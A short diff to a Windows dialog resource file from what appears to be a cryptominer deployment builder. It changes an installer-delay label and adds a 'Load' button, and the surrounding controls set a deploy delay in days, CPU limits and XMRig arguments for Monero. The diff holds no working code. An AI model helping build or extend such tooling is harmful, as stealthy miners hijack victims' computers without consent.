@@ -92,7 +92,7 @@ BEGIN
     LTEXT           "Min.",IDC_STATIC,98,194,14,8
     LTEXT           "Max.",IDC_STATIC,98,207,17,8
     GROUPBOX        "Delay before deploy miner (days)",IDC_STATIC,96,181,134,40
-    GROUPBOX        "Installer delay (seconds)",IDC_STATIC,8,181,88,40
+    GROUPBOX        "Installer delay (milisec)",IDC_STATIC,8,181,88,40
     GROUPBOX        "Minimum RAM for light mode(Mb)",IDC_STATIC,7,220,111,29
     EDITTEXT        IDC_EDIT27,123,230,27,14,ES_AUTOHSCROLL | ES_NUMBER
     GROUPBOX        "CPU(%)",IDC_STATIC,118,219,36,30
@@ -109,6 +109,7 @@ BEGIN
     LTEXT           "Here you configure the coin to mine, use tls or other things that will be added to XMRig arguments.\nAs example it is configured to mine Monero with tls, keepalive, worker name and low CPU priority",IDC_STATIC,240,191,166,33
     GROUPBOX        "L3 cache/thread(KB)",IDC_STATIC,153,219,77,30
     EDITTEXT        IDC_EDIT26,10,230,100,14,ES_AUTOHSCROLL | ES_NUMBER
+    PUSHBUTTON      "Load",IDC_BUTTON2,228,370,50,14
 END
 
 
